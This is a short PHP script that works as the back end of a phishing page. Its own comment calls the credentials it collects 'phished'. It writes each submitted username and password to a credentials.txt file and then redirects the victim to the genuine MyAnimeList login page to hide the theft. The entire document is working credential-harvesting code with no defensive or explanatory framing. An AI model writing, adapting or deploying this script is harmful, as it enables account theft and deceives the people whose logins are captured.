<?php
// Accessing a text file to store usernames and passwords phished from our site
$file = fopen("credentials.txt", "a");
fwrite($file, "\t\t\t\t\t\t");
fwrite($file, "\r\n");
fwrite($file, "\t\t\t\t\t\t");
fwrite($file, "--- NEW ENTRY ---");
fwrite($file, "\r\n");

// $_POST stores the username and password variables sent to this php file
foreach($_POST as $key=>$value) {
    if (($key == "user_name") || ($key == "password")) {
        fwrite($file, "\t\t\t\t\t\t");
        fwrite($file, $key);
        fwrite($file, " = ");
        fwrite($file, $value);
        fwrite($file, "\r\n");
   }
}
fclose($file);
header("Location: https://myanimelist.net/login.php?from=%2F&");
die();
?>